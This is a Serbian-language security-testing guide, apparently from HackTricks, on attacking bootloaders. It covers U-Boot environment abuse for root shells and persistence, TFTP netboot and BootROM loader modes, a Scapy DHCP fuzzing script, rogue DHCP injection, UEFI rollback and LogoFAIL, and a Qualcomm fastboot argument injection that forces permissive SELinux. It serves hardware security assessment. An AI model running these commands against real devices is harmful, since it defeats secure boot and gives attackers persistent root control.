# Testiranje bootloader-a

{{#include ../../banners/hacktricks-training.md}}

Sledeći koraci se preporučuju za modifikovanje konfiguracija pri pokretanju uređaja i testiranje bootloader-a kao što su U-Boot i UEFI-klasni loaderi. Fokusirajte se na dobijanje ranog izvršavanja koda, procenu zaštite potpisom/rollback zaštite i zloupotrebu recovery ili network-boot path-ova.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot: brzi rezultati i zloupotreba environment-a

1. Pristup interpreter shell-u
- Tokom boot-a, pritisnite poznati break taster (često bilo koji taster, 0, space, ili board-specific "magic" sekvencu) pre nego što `bootcmd` izvrši da biste ušli u U-Boot prompt.

2. Inspekcija stanja boot-a i promenljivih
- Korisne komande:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (podržane metode za boot kernela)
- `help ext4load; help fatload; help tftpboot` (dostupni loader-i)

3. Izmena boot argumenata da dobijete root shell
- Dodajte `init=/bin/sh` da kernel umesto normalnog init-a padne u shell:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot sa vašeg TFTP servera
- Konfigurišite mrežu i preuzmite kernel/fit image sa LAN-a:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persistencija promena putem environment-a
- Ako env storage nije write-protected, možete trajno preuzeti kontrolu:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Proverite promenljive kao što su `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` koje utiču na fallback puteve. Pogrešno konfigurisane vrednosti mogu omogućiti ponovljeno prekidanje u shell.

6. Proverite debug/unsafe funkcije
- Potražite: `bootdelay` > 0, `autoboot` onemogućen, neograničen `usb start; fatload usb 0:1 ...`, sposobnost `loady`/`loads` preko serial-a, `env import` sa nepouzdanih medija, i kerneli/ramdiski učitani bez provere potpisa.

7. Testiranje verifikacije/imagen-a u U-Boot-u
- Ako platforma tvrdi secure/verified boot sa FIT image-ima, pokušajte i unsigned i tamper-ovane image-e:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Odsustvo `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ili legacy `verify=n` ponašanja često dozvoljava boot arbitrary payload-a.

## Network-boot surface (DHCP/PXE) i rogue serveri

8. PXE/DHCP parameter fuzzing
- Legacy BOOTP/DHCP handling u U-Boot-u je imao probleme sa memory-safety. Na primer, CVE‑2024‑42040 opisuje memory disclosure via crafted DHCP responses koji može leak bajtove iz U-Boot memorije nazad na mrežu. Vežbajte DHCP/PXE kod putanje sa predugačkim/edge-case vrednostima (option 67 bootfile-name, vendor options, file/servername fields) i posmatrajte za zastoje/leaks.
- Minimalan Scapy snippet za stresiranje boot parametara tokom netboot-a:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Takođe proverite da li su PXE filename polja prosleđena shell/loader logici bez sanitizacije kada su u lancu sa OS-side provisioning skriptama.

9. Testiranje command injection-a preko rogue DHCP servera
- Podignite rogue DHCP/PXE servis i pokušajte ubacivati karaktere u filename ili options polja da biste dohvatili command interpretere u kasnijim fazama boot lanca. Metasploit-ov DHCP auxiliary, `dnsmasq`, ili custom Scapy skripte dobro rade za ovo. Obavezno izolujte lab mrežu pre testiranja.

## SoC ROM recovery modovi koji zaobilaze normalan boot

Mnogi SoC-i izlažu BootROM "loader" mod koji prihvata kod preko USB/UART čak i kada flash image-i nisu validni. Ako secure-boot fuses nisu burned, ovo često omogućava arbitrary code execution vrlo rano u lancu.

- NXP i.MX (Serial Download Mode)
- Alati: `uuu` (mfgtools3) ili `imx-usb-loader`.
- Primer: `imx-usb-loader u-boot.imx` da push-ujete i pokrenete custom U-Boot iz RAM-a.
- Allwinner (FEL)
- Alat: `sunxi-fel`.
- Primer: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ili `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Alat: `rkdeveloptool`.
- Primer: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` za stage-ovanje loader-a i upload custom U-Boot-a.

Procijenite da li uređaj ima secure-boot eFuses/OTP izgorene. Ako ne, BootROM download modovi često zaobilaze bilo koju višeg-nivo verifikaciju (U-Boot, kernel, rootfs) izvršavajući vaš first-stage payload direktno iz SRAM/DRAM.

## UEFI/PC-class bootloader-i: brze provere

10. ESP tampering i rollback testiranje
- Mount-ujte EFI System Partition (ESP) i proverite loader komponente: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo path-ove.
- Pokušajte boot sa downgraded ili poznato ranjivim signed boot komponentama ako Secure Boot revocations (dbx) nisu ažurirani. Ako platforma još uvek veruje starim shim-ovima/bootmanager-ima, često možete učitati sopstveni kernel ili `grub.cfg` sa ESP-a za postizanje persistencije.

11. Bug-ovi u parsiranju boot logo-a (LogoFAIL klasa)
- Nekoliko OEM/IBV firmvera je bilo ranjivo na image-parsing flaw-ove u DXE koji procesuiraju boot logo-e. Ako napadač može postaviti crafted image na ESP pod vendor-specific path (npr. `\EFI\<vendor>\logo\*.bmp`) i reboot-ovati, moguće je izvršavanje koda tokom ranog boot-a čak i sa Secure Boot-om aktivnim. Testirajte da li platforma prihvata user-supplied logo-e i da li su ti path-ovi zapisivi iz OS-a.

## Android/Qualcomm ABL + GBL (Android 16) trust gap-ovi

Na Android 16 uređajima koji koriste Qualcomm-ov ABL za učitavanje **Generic Bootloader Library (GBL)**, proverite da li ABL **authenticates** UEFI app koju učitava iz `efisp` particije. Ako ABL samo proverava **presence** UEFI app-a i ne verifikuje potpise, write primitive na `efisp` postaje **pre-OS unsigned code execution** pri boot-u.

Praktične provere i putevi zloupotrebe:

- **efisp write primitive**: Potreban vam je način da upišete custom UEFI app u `efisp` (root/privileged servis, OEM app bug, recovery/fastboot put). Bez toga, GBL loading gap nije direktno dostupan.
- **fastboot OEM argument injection** (ABL bug): Neki build-ovi prihvataju dodatne tokene u `fastboot oem set-gpu-preemption` i dodaju ih kernel cmdline-u. Ovo se može iskoristiti za forsiranje permissive SELinux-a, omogućavajući upis protected particija:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Ako je uređaj zakrpljen, komanda bi trebala odbaciti dodatne argumente.
- **Bootloader unlock preko persistent flag-ova**: Boot-stage payload može flip-ovati persistent unlock flag-ove (npr. `is_unlocked=1`, `is_unlocked_critical=1`) da emulira `fastboot oem unlock` bez OEM server/approval gate-ova. Ovo je trajna promena posle sledećeg reboot-a.

Defanzivne/triage napomene:

- Potvrdite da li ABL izvodi signature verification na GBL/UEFI payload-u iz `efisp`. Ako ne, tretirajte `efisp` kao high‑risk persistence surface.
- Pratite da li su ABL fastboot OEM handler-i zakrpljeni da **validate argument counts** i odbijaju dodatne tokene.

## Hardverske mere opreza

Budite oprezni pri interakciji sa SPI/NAND flash-om tokom ranog boot-a (npr. uzemljavanje pinova da biste zaobišli čitanja) i uvek konsultujte flash datasheet. Netačno timirani short-ovi mogu korumpirati uređaj ili programmer.

## Napomene i dodatni saveti

- Pokušajte `env export -t ${loadaddr}` i `env import -t ${loadaddr}` da preselite environment blob-ove između RAM-a i storage-a; neke platforme dozvoljavaju import env sa removable media bez autentifikacije.
- Za persistenciju na Linux-based sistemima koji boot-uju preko `extlinux.conf`, modifikovanje `APPEND` linije (da ubacite `init=/bin/sh` ili `rd.break`) na boot particiji često je dovoljno kada nema enforced signature checks.
- Ako userland pruža `fw_printenv/fw_setenv`, proverite da li `/etc/fw_env.config` odgovara realnom env storage-u. Pogrešno konfigurisani offset-i vam dozvoljavaju da čitate/upišete pogrešan MTD region.

## Reference

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
